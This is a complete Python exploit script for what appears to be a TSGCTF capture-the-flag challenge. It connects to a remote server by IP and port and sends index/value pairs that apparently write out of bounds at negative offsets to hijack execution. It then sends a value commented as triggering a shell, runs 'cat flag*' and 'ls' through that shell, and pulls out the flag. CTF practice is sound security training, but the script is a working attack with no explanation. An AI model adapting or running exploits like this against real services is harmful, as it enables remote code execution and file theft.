#!/usr/bin/env python3
import socket, time

s = socket.socket()
s.connect(('34.84.25.24', 58554))
s.settimeout(5)

def snd(x): s.sendall(f"{x}\n".encode()); time.sleep(0.1)
def rcv(): 
    try: return s.recv(8192)
    except: return b''

# Exploit sequence
for i, v in [(0,1852400175), (1,6845231), (-22,6295744), (-21,0), (-40,4196032), (-39,0)]:
    rcv(); snd(i); rcv(); snd(v)

rcv(); snd(-1)  # Trigger shell
time.sleep(1)

# Get flag
snd('cat flag*'); time.sleep(0.5)
snd('ls'); time.sleep(0.5)

out = b''
for _ in range(10):
    out += rcv()
    if b'TSGCTF{' in out: break

print(out.decode(errors='ignore'))
if b'TSGCTF{' in out:
    i = out.find(b'TSGCTF{')
    j = out.find(b'}', i)
    print(f"\n[+] FLAG: {out[i:j+1].decode()}")
s.close()
